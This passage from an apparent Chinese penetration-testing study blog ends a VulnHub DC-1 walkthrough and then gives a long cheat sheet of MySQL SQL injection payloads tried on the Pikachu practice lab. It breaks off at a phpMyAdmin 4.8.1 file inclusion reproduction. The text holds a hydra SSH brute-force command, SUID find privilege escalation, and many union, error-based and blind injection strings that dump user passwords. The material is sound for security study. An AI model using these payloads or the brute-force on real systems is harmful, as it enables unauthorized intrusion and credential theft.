src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272233453.png" alt="image-20220227223305329"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 但是发现一个 flag4 的用户, 使用 hydar 爆破这个用户的密码</span><br><span class="line">$ hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.22.23</span><br><span class="line"># -l 指定用户名</span><br><span class="line"># -p 指定密码字典</span><br><span class="line"># ssh://ip 指定使用协议和ip地址</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><a href="http://www.ha97.com/5186.html">暴力密码在线破解工具Hydra详解</a></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272239231.png" alt="image-20220227223836106"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 登录目标机, 用户名: flag4密码: orange</span><br><span class="line"># 也可以使用 ssh 远程登录</span><br><span class="line"># 发现了第四个 flag</span><br><span class="line">$ cat flag4.txt</span><br><span class="line"></span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it's not that easy.  Or maybe it is?</span><br><span class="line">翻译: 你能用这个同样的方法找到或访问根中的标志吗？也许可以。但也许并不那么容易。 也可能是这样？</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272243226.png" alt="image-20220227224315173"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272246801.png" alt="image-20220227224618301"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272246572.png" alt="image-20220227224645254"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># flag4提示flag在root目录下</span><br><span class="line"># 在/root下发现thefinalflag.txt，但是没有读取的权限</span><br><span class="line">$ cd /root</span><br><span class="line"># 使用命令 find 试试</span><br><span class="line">$ find /root</span><br><span class="line"># 发现了最后一个 flag, 但是没有权限查看</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272250372.png" alt="image-20220227225006522"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272252803.png" alt="image-20220227225209803"></p><h3 id="四、提权"><a href="#四、提权" class="headerlink" title="四、提权"></a>四、提权</h3><p>根据flag3和flag4都提到了find,所以下面我们利用find文件提权</p><p>参考：<a href="https://blog.csdn.net/qq_36119192/article/details/84872644">Linux下用SUID提权</a>、<a href="https://blog.csdn.net/qq_40510246/article/details/95939784?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase">linux提权-SUID提权</a>、<a href="https://www.cnblogs.com/huchong/p/9961625.html">find命令之exec</a></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。</span><br><span class="line"># 查找具有 root 权限的 SUID的文件</span><br><span class="line">$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"># 进入 root 目录查看 最后一个flag</span><br><span class="line">$ cd /root/</span><br><span class="line">$ ls</span><br><span class="line">$ cat thefinaflag.txt</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you've enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br><span class="line">翻译: 做得好！!!!!希望你喜欢这个，并学到一些新技能。你可以让我知道你对这个小旅程的看法。通过Twitter联系我 - @DCAU7</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272312999.png" alt="image-20220227231230776"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272314867.png" alt="image-20220227231414718"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202272315776.png" alt="image-20220227231557703"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub靶机 </tag>
            
            <tag> 注入 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库注入</title>
      <link href="/2022/02/20/4%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2022/02/20/4%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="MySql"><a href="#MySql" class="headerlink" title="MySql"></a>MySql</h2><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a><strong>联合查询</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># 需要使用的函数</span><br><span class="line">concat() # 将多个字串连接为一行输出</span><br><span class="line">group_concat() # 可以配合 group by asc/desc 使用</span><br><span class="line">group_ws() # 增加分隔符号并将字串连接为一行输出</span><br><span class="line">version() # 显示版本</span><br><span class="line">database() # 显示当前数据库</span><br><span class="line">union select # 联合查询</span><br><span class="line">information_schema.schemata # 存储所有库名的位置</span><br><span class="line">schema_name # 查库名</span><br><span class="line">table_name # 查表名</span><br><span class="line">column_name # 查字段名</span><br><span class="line">distinct() # 去重</span><br><span class="line">limit 1,1 # 从第 N 条记录开始, 返回 M 条记录</span><br><span class="line"></span><br><span class="line"># 判断注入</span><br><span class="line">?id=0'"\)]}--+# 判断是否是字符型和闭合情况</span><br><span class="line">?id=0 and 1=1# 盘点是否是数字型</span><br><span class="line"># 判断显示字段数</span><br><span class="line">?id=0' order by 3 --+# 回显正常为正确字段数</span><br><span class="line"># 判断显示位置</span><br><span class="line">?id=0' union select 1,2,3 --+</span><br><span class="line"># 查看数据库版本,和当前数据库名</span><br><span class="line">?id=0' union select 1,database(),version() --+</span><br><span class="line"># 查看所有数据库名</span><br><span class="line">?id=0' union select 1,2,schema_name from information_schema.schemata limit 1,1 --+</span><br><span class="line">?id=0' union select 1,2,group_concat(schema_name) from information_schema.schemata --+</span><br><span class="line"># 查看数据库的表名和当前数据库的表名</span><br><span class="line">?id=0' union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1 --+</span><br><span class="line">?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名' --+</span><br><span class="line"># 查看表中字段名</span><br><span class="line">?id=0' union select 1,2 column_name from information_schema.columns where table_name='表名' limit 0,1 --+</span><br><span class="line">?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' --+</span><br><span class="line"># 查看表中数据</span><br><span class="line">?id=0' union select 1,2,group_concat(字段,": ",字段) from 表名 --+</span><br><span class="line">?id=0' union select 1,2,group_ws("~",字段,字段) from 表名 --+</span><br><span class="line">?id=0' union select 1,2,concat(字段,字段) from 表名 --+</span><br><span class="line">?id=0' union select 1,字段1,字段2 from 表名 limit 0,1--+</span><br></pre></td></tr></tbody></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 测试注入点时,故意构造错误的MySQL语句,如果页面回显的错误信息为数据库报出来的错误,即可使用报错注入,只显示32位长度的数据</span><br><span class="line"># 报错注入使用的函数</span><br><span class="line">extractvalue(参数1,参数2) # 参数1表示操作的目标XML文档，参数2则表示目标XML的查找路径。</span><br><span class="line">updatexml(参数1,参数2,参数3)    # XML文档,路径,替换值,原理和 extractvalue() 是相同的</span><br><span class="line">substr(1,30) # 截断字串位数, 1 起始位置, 30 长度</span><br><span class="line"># 查看库</span><br><span class="line">?id=0' and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '</span><br><span class="line"># 查看表</span><br><span class="line">?id=0' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from infomation_schema.tables where table_schema='库名')0x7e)) or'</span><br><span class="line"># 查看表,截断32位显示</span><br><span class="line">?id=0' and extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_shcema='库名' limit 0,1),32),0x7e)) or'</span><br><span class="line"># 查看字段</span><br><span class="line">?id=0' and extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from infomation_schema.columns where table_name='表名' limit 0,1),32),0x7e)) or'</span><br><span class="line"># updatexml 报错注入 查看字段</span><br><span class="line">?id=0' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_name='表名'),32)0x7e),0) or'</span><br><span class="line"># 查看表中数据</span><br><span class="line">?id=0' and extractvalue(1,concat(0x7e,substr((select group_concat(字段1,": "字段2) from 表名 limit 0,1),32),0x7e)) or'</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># floor报错注入和前面两个函数不同，floor函数报错注入的原理涉及到以下几个函数：</span><br><span class="line">1. floor()：小数向下取整数（向上取整数是ceiling()函数）</span><br><span class="line">2. rand()：随机返回0 ~ 1之间的小数</span><br><span class="line">3. concat_ws()：将括号内的数据用第一个字段连接起来</span><br><span class="line">4. group by子句：分组语句，常用于结合统计函数，根据一个列或多个列，对结果集进行分组</span><br><span class="line">5. as：就是别名</span><br><span class="line">6. count函数：汇总统计数量</span><br><span class="line">7. limit：显示指定行数</span><br><span class="line"># </span><br></pre></td></tr></tbody></table></figure><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 判断当前库名长度和所有库名的长度</span><br><span class="line">?id=0' and length(database())&gt;5 --+</span><br><span class="line">?id=0' and length((select group_concat(schema_name) from</span><br><span class="line">information_schema.schemata))=90--+</span><br><span class="line"># 判断当前库名</span><br><span class="line">?id=0' and (substr(database(),1,1))&gt;'a' --+</span><br><span class="line">?id=0' and ascii(substr(database(),1,1))&gt;100 --+</span><br><span class="line">?id=0' and ascii(substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),1,1))=112 --+</span><br><span class="line"># 判断表</span><br><span class="line">?id=0' and ascii(substr((select group_concat(table_name) from information_schema.tables limit 0,1),1,1))=112 --+</span><br><span class="line"># 判断字段</span><br><span class="line">?id=0' and ascii(substr((select group_concat(column_name) from information_schema.columns limit 0,1),1,1))=112 --+</span><br></pre></td></tr></tbody></table></figure><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><strong>时间盲注</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 布尔的payload 套一层 if slee() 就可以变成 时间盲注</span><br><span class="line"># 语法1. sleep()函数:让数据库暂停n秒, if(select database(),sleep(5),1)</span><br><span class="line"># 语法2. benchmark()函数:命令执行次数, benchmark(50000000,md5('1'))</span><br><span class="line"># 判断注入</span><br><span class="line">?id=0' and sleep(5) --+</span><br><span class="line">?id=0' and benchmark(50000,md5('1'))--+</span><br><span class="line"># 判断库名长度</span><br><span class="line">?id=0' and if(length((select group_concat(schema_name) from information_schema.schemata))=90,sleep(5),0) --+</span><br><span class="line"># 判断库名</span><br><span class="line">?id=0' and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),71,1))=112,sleep(5),0) --+</span><br></pre></td></tr></tbody></table></figure><h4 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a><strong>token防爆破</strong></h4><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116364.png" alt="image-20220206180531938"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116031.png" alt="image-20220206180509330"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116941.png" alt="image-20220206180616794"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116982.png" alt="image-20220206181026584"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116904.png" alt="image-20220206181047274"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116673.png" alt="image-20220206181134849"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116202.png" alt="image-20220206181146506"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116132.png" alt="image-20220206181348236"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116363.png" alt="image-20220206181600606"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202116926.png" alt="image-20220206181733746"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120827.png" alt="image-20220206181825835"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120918.png" alt="image-20220206181843657"></p><h4 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a><strong>搜索型注入</strong></h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%//判断回显用户</span><br><span class="line">vi%' order by 3 #//判断字段数</span><br><span class="line">vi%' union select 1,2,3 #//回显点</span><br><span class="line">vi%' union select version(),database(),3 #//版本和当前库名</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120259.png" alt="image-20220206195611524"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120752.png" alt="image-20220206201152078"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120192.png" alt="image-20220206201304437"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">所有库</span><br><span class="line">vi%' union select 1,2,group_concat(schema_name) from information_schema.schemata #</span><br><span class="line">爆表</span><br><span class="line">vi%' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class="line">爆字段</span><br><span class="line">vi%' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' #</span><br><span class="line">爆内容</span><br><span class="line">vi%' union select 1,2,group_concat(username,": ",password) from users #</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120502.png" alt="image-20220206201836920"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120054.png" alt="image-20220206202317937"></p><h4 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a><strong>xx型注入</strong></h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1') or 1=1 #//判断注入</span><br><span class="line">1') order by 2 #//判断字段数</span><br><span class="line">1') union select 1,2 #//判断回显点</span><br><span class="line">1') union select version(),database() #//版本和当前库名</span><br><span class="line">//所有库</span><br><span class="line">1') union select 1,group_concat(schema_name) from information_schema.schemata #</span><br><span class="line">//爆表</span><br><span class="line">1') union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class="line">//爆字段</span><br><span class="line">1') union select 1,group_concat(column_name) from information_schema.columns where table_name= 'users' #</span><br><span class="line">//爆内容</span><br><span class="line">1') union select 1,group_concat(username,": ",password) from users #</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120465.png" alt="image-20220206203126592"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120123.png" alt="image-20220206203255820"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120603.png" alt="image-20220206203430444"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120748.png" alt="image-20220206204158481"></p><h4 id="insert型注入"><a href="#insert型注入" class="headerlink" title="insert型注入"></a><strong>insert型注入</strong></h4><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120316.png" alt="image-20220206205311630"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120998.png" alt="image-20220206205337892"></p><h4 id="报错注入-extractvalue"><a href="#报错注入-extractvalue" class="headerlink" title="报错注入 extractvalue"></a><strong>报错注入 extractvalue</strong></h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">123'and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '</span><br><span class="line">爆表</span><br><span class="line">1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu' limit+0,1),0x7e)) or'//前面32位</span><br><span class="line">1' and extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='pikachu' limit 0,1),32),0x7e)) or'//最后几位</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120573.png" alt="image-20220206205604457"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120595.png" alt="image-20220206205955260"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120585.png" alt="image-20220206210157224"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">爆字段</span><br><span class="line">1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1),0x7e)) or'//前面0-32位</span><br><span class="line">1' and extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1),32),0x7e)) or'//中间32-64位</span><br><span class="line">1' and extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1),64),0x7e)) or'//64-96</span><br><span class="line">1' and extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' limit 0,1),96),0x7e)) or'//最后</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120355.png" alt="image-20220206210857784"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆内容</span><br><span class="line">1' and extractvalue(1,concat(0x7e,(select group_concat(username,": ",password) from users),0x7e)) or'</span><br><span class="line">1' and extractvalue(1,concat(0x7e,substr((select group_concat(username,": ",password) from users),64),0x7e)) or'</span><br><span class="line">1' and extractvalue(1,concat(0x7e,substr((select group_concat(username,": ",password) from users),96),0x7e)) or'</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202120512.png" alt="image-20220206211030191"></p><h4 id="update型注入"><a href="#update型注入" class="headerlink" title="update型注入"></a><strong>update型注入</strong></h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">库名</span><br><span class="line">1'and updatexml(1,concat(0x7e,database()),0) or'</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">表名</span><br><span class="line">1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from</span><br><span class="line">information_schema.tables where table_schema="pikachu"),0x7e),1) or'</span><br><span class="line">1' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema="pikachu"),32),0x7e),1) or'</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字段</span><br><span class="line">1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users"),0x7e),1) or'</span><br><span class="line">1' and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name="users"),32),0x7e),1) or'</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字段内容</span><br><span class="line">1' and updatexml(1,concat(0x7e,(select group_concat(username,": ",password) from users),0x7e),1) or'</span><br><span class="line">1' and updatexml(1,concat(0x7e,substr((select group_concat(username,": ",password) from users),32),0x7e),1) or'</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119002.png" alt="image-20220206212343188"></p><h4 id="datele注入"><a href="#datele注入" class="headerlink" title="datele注入"></a><strong>datele注入</strong></h4><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119273.png" alt="image-20220206212501799"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119879.png" alt="image-20220206212553298"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">库名</span><br><span class="line">1 and updatexml(1,concat(0x7e,database()),0)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119535.png" alt="image-20220206213130375"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">爆表</span><br><span class="line">1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema="pikachu"),0x7e),0)</span><br><span class="line">1 and updatexml(1,concat(0x7e,substr((select group_concat(table_name)from information_schema.tables where table_schema="pikachu"),32),0x7e),0)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">爆字段</span><br><span class="line">1 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name="users"),0x7e),0)</span><br><span class="line">1 and updatexml(1,concat(0x7e,substr((select group_concat(column_name)from information_schema.columns where table_name="users"),32),0x7e),0)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">爆内容</span><br><span class="line">1 and updatexml(1,concat(0x7e,(select group_concat(username,": ",password) from users),0x7e),0)</span><br><span class="line">1 and updatexml(1,concat(0x7e,substr((select group_concat(username,": ",password) from users),32),0x7e),0)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119356.png" alt="image-20220206213548868"></p><h4 id="http-header-注入"><a href="#http-header-注入" class="headerlink" title="http header 注入"></a><strong>http header 注入</strong></h4><p>登录后, burp抓包,报错注入</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119228.png" alt="image-20220206215455326"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">1' or updatexml(1,concat(0x7e,database()),0) or'</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119835.png" alt="image-20220206215632287"></p><p>cookie处也可以注入</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119178.png" alt="image-20220206220210457"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">爆表</span><br><span class="line">1' or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema="pikachu"),0x7e),0) or'</span><br><span class="line">1 or updatexml(1,concat(0x7e,substr((select group_concat(table_name)from information_schema.tables where table_schema="pikachu"),32),0x7e),0) or'</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119236.png" alt="image-20220206220350183"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">爆字段</span><br><span class="line">1' or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name="users"),0x7e),0) or'</span><br><span class="line">1' or updatexml(1,concat(0x7e,substr((select group_concat(column_name)from information_schema.columns where table_name="users"),32),0x7e),0) or'</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119219.png" alt="image-20220206220526610"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">爆内容</span><br><span class="line">1' or updatexml(1,concat(0x7e,(select group_concat(username,": ",password) from users),0x7e),0) or'</span><br><span class="line">1' or updatexml(1,concat(0x7e,substr((select group_concat(username,": ",password) from users),32),0x7e),0) or'</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119846.png" alt="image-20220206220629288"></p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a><strong>文件包含</strong></h4><h5 id="复现phpmyadmin4-8-1文件包含漏洞"><a href="#复现phpmyadmin4-8-1文件包含漏洞" class="headerlink" title="复现phpmyadmin4.8.1文件包含漏洞"></a><strong>复现phpmyadmin4.8.1文件包含漏洞</strong></h5><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202142081.png" alt="image-20220120215219906"></p><p>根据这几行代码可以知道, 将$_REQUEST[‘target’]所表示的文件包含进来,target参数需要满足5个条件</p><pre><code> 1. 不能为空 2. 需要是字串 3. 不能以index开头 4. 不能在$target_blacklist数组里面 5. 满足Core类里面的checkPageValidity()函数检查</code></pre><p>phpmyadmin/libraries/classes/Core/php的443-476行</p><p><img 